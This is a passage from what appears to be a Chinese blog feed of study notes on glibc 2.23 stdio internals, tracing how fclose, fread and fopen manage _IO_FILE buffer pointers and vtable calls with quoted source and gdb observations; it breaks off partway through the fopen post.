id="总结fclose函数调用流程：">总结fclose函数调用流程：</h2><p>先将_IO_FILE结构体脱链，然后去看输出缓冲区中是否还有内容，如果有的话就系统调用write将输出缓冲区中的内容写入文件然后刷新输出缓冲区。接着系统调用close关闭文件，最后将申请的reserve area和装有_IO_FILE结构体的堆块给释放掉。</p><h2 id="参考文章：">参考文章：</h2><p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fclose">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis">IO FILE之fclose详解 « 平凡路上 (ray-cp.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> 源码调试&amp;&amp;分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码调试&amp;&amp;分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO学习--源码分析fread函数</title>
      <link href="/posts/323816c7.html"/>
      <url>/posts/323816c7.html</url>
      
        <content type="html"><![CDATA[<p>上一篇分析的是fopen函数，这次来分析下fread函数。<br><a href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IO学习–源码调试fopen函数</a></p><h2 id="前置知识：">前置知识：</h2><p>在分析fread函数时，应该先明确一下输入缓冲区是怎么来的。</p><p>首先<strong>fread函数会先将数据读到输入缓冲区中，然后从输入缓冲区中执行memcpy函数，拷贝一定字节的数据到我们指定的内存地址上</strong>。而这个输入缓冲区是从哪到哪呢？由两个指针分别声明了这片区域的开始和结束，他们分别叫做**_IO_read_base和_IO_read_end，他们之间的区域就是输入缓冲区**。这样看起来似乎还需要一个输出缓冲区，难道需要malloc申请两个堆块来分别表示输入缓冲区和输出缓冲区么？非也，其实<strong>malloc函数自始至终只申请了一个堆块</strong>，<strong>这个堆块的区域也叫做reserve area</strong>，而_IO_buf_base和_IO_buf_end两个指针则分别声明了这个reserve area的始末。然后将 _IO_read_ptr; _IO_read_end; _IO_read_base;_IO_write_base;_IO_write_ptr; _IO_write_end;这六个指针全部初始化为了_IO_buf_base的值，现在的输入缓冲区和输出缓冲区还不存在(因为现在 _IO_read_end和 _IO_read_base的值相同)，以输入缓冲区为例，<strong>读入数据时是执行了系统调用read，而此时的数据是在reserve area中，紧接着 _IO_read_end就会加上刚刚读入的数据的个数，那么此时 _IO_read_end和 _IO_read_base的值变的不同了。而现在这二者之间的区域就成为输入缓冲区</strong>。</p><p>再提一下_IO_FILE结构体中的一些指针(如下)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span> </span><br><span class="line"><span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br></pre></td></tr></table></figure><p>其中_<strong>IO_buf_base 和 _IO_buf_end两个指针的作用分别是标明reserve area的始末</strong>。<strong>_IO_read_base 和  _IO_read_end两个指针的作用分别是标明输入缓冲区的始末(write那两个指针同理)</strong>，现在假设有一个30字节的flag文件，然后我连续执行两次fread函数，每次从文件中只读10字节，那么第二次执行fread函数是从哪开始读呢，很明显并不是文件的开始来读取了，而是接着上回fread函数读到的位置，继续读10字节数据。但我们怎么去记录上回fread函数读到哪了呢，这就需要用到**_IO_read_ptr指针了，它是来记录下一次数据应该从输入缓冲区的哪里开始读了。也就是说_IO_read_base 和 _IO_read_ptr 之间的区域是已经使用了的输入缓冲区，而 _IO_read_ptr 和 _IO_read_end之间的区域是输入缓冲区的剩余部分(也就是还未使用部分)**。</p><p>通过上面这两段文字，应该可以对刚学习IO的师傅对_IO_FILE结构体中表示缓冲区位置的指针有一些了解了。</p><p>同时这次还要提到vtable，它是_IO_FILE_plus结构体中的一个字段，也是一个虚表指针。它指向了_IO_jump_t结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于_IO_jump_t结构体，我目前的理解它就是一个跳转表，这里放的都是函数指针。通过不同的偏移获取不同的函数指针，然后将其调用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="整体流程">整体流程</h2><p><img src="../img/image-20221007220413772.png" alt="image-20221007220413772"></p><p><img src="https://s2.loli.net/2022/08/11/U2BbDW57QiMHZGz.png" alt="image-20220811085348962"></p><p>上面第一张图片是fread函数的整体流程，第二张图片是根据我下面写的这个源代码对应的函数调用流程(调试的时候结合这两个图片，可以对自己调试到哪部分有个比较清楚的认知)。</p><h2 id="源代码：">源代码：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(value,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p><h2 id="源码分析-源码调试">源码分析&amp;&amp;源码调试</h2><p>先看fread函数源码，发现它的代码很短(如下)，这里主要就是调用了_IO_sgetn函数</p><p><img src="https://s2.loli.net/2022/08/11/Py8OzWV5RXhE7vn.png" alt="image-20220810100233854"></p><p>查看_IO_sgetn函数后，发现它只调用了vtable中的_IO_XSGETN</p><p><img src="https://s2.loli.net/2022/08/11/OGN6ZoP8EyptgmU.png" alt="image-20220810100551020"></p><p>然后再溯源的话就是几个宏定义，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta"> (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \</span></span><br><span class="line"><span class="meta">   + (THIS)-&gt;_vtable_offset))</span></span><br></pre></td></tr></table></figure><p>我简单分析一下上述部分，核心就是_IO_JUMPS_FUNC(THIS)返回了_IO_jump_t地址，由于JUMP2第一个参数就是__xsgetn，所以-&gt;FUNC访问的就是_IO_jump_t结构体中__xsgetn,然后我们用gdb看下此时的_IO_jump_t结构体中的值(如下)，因此最后我们跳转到了0x7ffff7a86df0处。</p><img src="https://s2.loli.net/2022/08/11/YXtvqDUhJs4b3wC.png" alt="image-20220810102706007" style="zoom:50%;" /><p>然后我们看一下汇编如何实现的这里。</p><img src="https://s2.loli.net/2022/08/11/eSmUDlx1iQtk4NG.png" alt="image-20220810103020508" style="zoom:50%;" /><p>先是让rdi+0xd8指向的内容赋值给了rax寄存器。而<strong>此时的rdi就是_IO_list_all的值</strong>，加上0xd8这个偏移，正好就是_IO_FILE_plus结构体中的vtable字段。加上[]寻址后，也就是拿到了_IO_jump_t结构体的地址。</p><p>然后第二条指令是<code>mov    rax, qword ptr [rax + 0x40]</code>，而_IO_jump_t结构体中偏移0x40的字段正好就是__xsgetn(如下图)</p><p><img src="https://s2.loli.net/2022/08/11/XMZ3fpkr9HPCUse.png" alt="image-20220810104331302"></p><p>最后加上[]寻址，rax为0x7ffff7a86df0(如下图)</p><img src="https://s2.loli.net/2022/08/11/KMEgbmJIB2tuXR7.png" alt="image-20220810104747743" style="zoom:50%;" /><p>如此，最终jmp rax，成功跳转到_IO_file_xsgetn函数(如下图)，而这个_IO_file_xsgetn函数也是fread函数实现的核心函数。</p><p><img src="https://s2.loli.net/2022/08/11/nbiIR5wgJdTWEc1.png" alt="image-20220810104948954"></p><h3 id="IO-file-xsgetn函数">_IO_file_xsgetn函数</h3><p>_IO_file_xsgetn函数主要分为三个部分(下面先是对三个部分的简单概括，后面是对三个部分的具体分析)：</p><p>1、先是去判断fp-&gt;_IO_buf_base(reserve area)是否为空，如果为空的话，就说明resever area还没有被分配出来，因此去调用_IO_doallocbuf函数来分配一个reserve area（源码如下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2、如果输入缓冲区剩余的大小不为空，并且还需要读入一定字节的数据，就调用memcpy函数，将输入缓冲区的数据复制到指的的内存处。have为输入缓冲区剩余大小，want为还要读入的字节数。（源码如下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>3、如果输入缓冲区剩余大小为0，并且存在resever area(这片区域就是fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)，且我们需求size比resever area区域小。那么调用__underflow函数执行系统调用read读入一定字节的数据到resever area中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">     &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">continue</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="分配resever-area">分配resever area</h3><p>先来看第一部分，也就是如果不存在resever area的情况下调用_IO_doallocbuf函数来分配一个resever area。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)<span class="comment">//如果存在resever area(保留区)的话，就直接返回</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<span class="comment">//调用了vtable中的函数</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为是第一次执行fread函数，所以肯定是会调用_IO_doallocbuf 函数的。通过观察上面的源码和下面的图片发现在这个_IO_doallocbuf函数中又调用了_IO_FILE的vtable中的IO_file_doallocate函数(如下图)</p><img src="https://s2.loli.net/2022/08/11/RDSyKFhG6QXtVpN.png" alt="image-20220810172752189" style="zoom:50%;" /><p>我这里就不放IO_file_doallocate函数的源代码了，调试看一下流程吧。</p><img src="https://s2.loli.net/2022/08/11/hLblpx6KDswty73.png" alt="image-20220810174150826" style="zoom:50%;" /><p>si进入IO_file_doallocate函数后，又调用了vtable中的_IO_file_stat函数。</p><img src="https://s2.loli.net/2022/08/11/c8VsSxhIEaXf4LG.png" alt="image-20220810174515007" style="zoom:50%;" /><p>而后又执行了系统调用fstat，这个系统调用是来获取文件状态，并且初始化st结构体的。可以看到此时的st_blksize为4096(如下图)</p><img src="https://s2.loli.net/2022/08/11/9t1UW8wcAHm3fBP.png" alt="image-20220810175134043" style="zoom:50%;" /><p>而这个st_blksize也就是接下来malloc申请的内存大小（也就是reserve area的大小）</p><img src="https://s2.loli.net/2022/08/11/dcANr24xuBPn5jq.png" alt="image-20220810175357303" style="zoom:50%;" /><p>当malloc函数将内存申请出来后，调用了vtable中的_IO_setb函数(如下)</p><img src="https://s2.loli.net/2022/08/11/cULi7ys3RaOpBrv.png" alt="image-20220810175823556" style="zoom:50%;" /><p>这个函数的代码很短</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读上面的源代码就明白，这个函数主要就是对_IO_buf_base和_IO_buf_end指针进行赋值。至此_IO_doallocbuf函数就结束了。<strong>_IO_doallocbuf函数主要是将resever area申请出来(大小为0x1000),并且对_IO_buf_base和_IO_buf_end指针进行赋值</strong>。</p><h3 id="从输入缓冲区中拷贝数据">从输入缓冲区中拷贝数据</h3><p>第二部分是最简单的，结合下面的源码很容易分析出来，拷贝我们指定的字节的内容从输入缓冲区的剩余部分到指定地址，但如果输入缓冲区剩余大小为空的话，就无法去拷贝。</p><p><strong>(have为输入缓冲区剩余大小，want为还要读入的字节数)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="执行系统调用read读入数据">执行系统调用read读入数据</h3><p>第三部分的核心是__underflow函数。它先是经过一些检查后，去调用了vtable中的_IO_file_underflow函数。检查如下，调用vtable中的_IO_file_underflow函数是在__underflow函数将要返回之时执行的_IO_UNDERFLOW (fp)。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/08/11/7FsBWa1IfY56eiD.png" alt="image-20220810181956710"></p><p>因为宏定义<code># define _IO_new_file_underflow _IO_file_underflow</code>，所以_IO_file_underflow在源码中为_IO_new_file_underflow.</p><p>然后上来就是很多检查，不过根据程序当前的状态，直接跳过了前面的检查。先去执行了_IO_switch_to_get_mode 函数，该函数将fp-&gt;_IO_read_base进行了赋值，其他指针依然为0。</p><p>等到_IO_switch_to_get_mode函数执行结束，出来之后就是疯狂的对read和write字段进行赋值，这里都初始化为了_IO_buf_base，代码如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">  = fp-&gt;_IO_buf_base;</span><br></pre></td></tr></table></figure><p>此时的_IO_FILE结构体各个字段如下</p><img src="https://s2.loli.net/2022/08/11/7NyOSiozVua2W3l.png" alt="image-20220810183427096" style="zoom:50%;" /><p>然后此时调用了虚表中的_IO_file_read函数(如下图)</p><p><img src="https://s2.loli.net/2022/08/11/2wpmz16rJixnuAE.png" alt="image-20220810183730754"></p><p>而后该函数进行了系统调用read，它的第二个参数也就是fp-&gt;_IO_buf_base的值，第三个参数就是fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base的值。此时也才终于将文件中的数据读入到了resever area中(我认为现在数据还并不是在输入缓冲区中，因为按照定义的话_IO_read_end  _IO_read_base之间的才属于输入缓冲区，而现在还没有挪动_IO_read_end指针，因此严谨一些的话，现在数据是属于resever area中的)</p><p><img src="https://s2.loli.net/2022/08/11/ukGAYwK3PVNv1ly.png" alt="image-20220810184138466"></p><p>而后_IO_SYSREAD函数返回，read系统调用读入的字节数返回给变量count。此时执行到fp-&gt;_IO_read_end += count才算是将_IO_read_end 的指针移动，现在可以说是刚刚写入的数据位于了输入缓冲区中。</p><p><img src="https://s2.loli.net/2022/08/11/JnxizwrePEjB9Ts.png" alt="image-20220810185946550"></p><p>由于第二部分和第三部分是位于while循环中的，因此第三部分执行后，再次来到了第二部分。这回fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr的值是存在的，所以这次就可以进入if去执行memcpy函数了(如下)</p><img src="https://s2.loli.net/2022/08/11/Z28dwmJCfMTI1LA.png" alt="image-20220810190631208" style="zoom:50%;" /><p>兜兜转转了很久，一直都是围绕着数据从文件中写到输入缓冲区中的操作，终于到了memcpy函数，通过这个拷贝函数，我们就可以将输入缓冲区中的数据拷贝指定的字节数到指定的地址，最后将指针_IO_read_ptr进行更新(如下图)，同时将want置零。</p><img src="https://s2.loli.net/2022/08/11/wFEjuN5IMZfL3ns.png" alt="image-20220810191534235" style="zoom:50%;" /><p>该fread函数的源码分析至此就结束了，看一下最后的_IO_FILE结构体</p><img src="https://s2.loli.net/2022/08/11/6PqiupBO3AMNLf4.png" alt="image-20220810200528302" style="zoom:50%;" /><h2 id="总结fread函数调用流程：">总结fread函数调用流程：</h2><p>先判断是否存在reserve area(没有的话就malloc申请出来)，再去判断输入缓冲区是否还有剩余区域，如果有的话就直接拷贝输入缓冲区剩余部分的数据，如果没有的话，执行系统调用read从文件中读取数据到输入缓冲区中，然后循环再次去执行memcpy函数拷贝输入缓冲区的数据。</p><p>因为是初学IO，因此有些地方可能会理解有误，如果存在问题欢迎师傅们斧正</p><h2 id="参考文章：">参考文章：</h2><p><a href="https://www.anquanke.com/post/id/177958#h3-3">IO FILE之fread详解 - 安全客，安全资讯平台 (anquanke.com)</a></p><p><a href="http://blog.leanote.com/post/mut3p1g/file-struct">(leanote.com)</a></p><p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fread">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis">IO FILE之fwrite详解 « 平凡路上 (ray-cp.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> 源码调试&amp;&amp;分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码调试&amp;&amp;分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO学习--源码调试fopen函数</title>
      <link href="/posts/ce09b1a.html"/>
      <url>/posts/ce09b1a.html</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面：">写在前面：</h2><p>这篇文章是学习IO，进行源码分析四部曲中的第一篇，本篇主要就是<strong>源码调试fopen函数</strong>，并<strong>没有单独对fopen函数的源码专门阅读分析</strong>(之后的三篇基本上是源码分析)。如果要看fopen函数源码分析的话可以去看下文末的参考文章(师傅们写的都非常好诶)</p><p>这里我写了一篇关于初学者应该如何去读glibc源码的文章(希望可以帮助到刚刚入门的师傅们) <a href="https://www.cnblogs.com/ZIKH26/articles/16582817.html">here</a></p><h2 id="前置知识">前置知识</h2><h3 id="IO-FILE-plus结构体">_IO_FILE_plus结构体</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>_IO_FILE_plus结构包含了_IO_FILE结构体和 _IO_jump_t 结构体。</p><h3 id="IO-FILE结构体">_IO_FILE结构体</h3><p>先说_IO_FILE结构体，该结构体就是标准IO库中用来描述文件的结构，在程序执行fopen函数时会创建该结构，并分配在堆中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span> </span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span 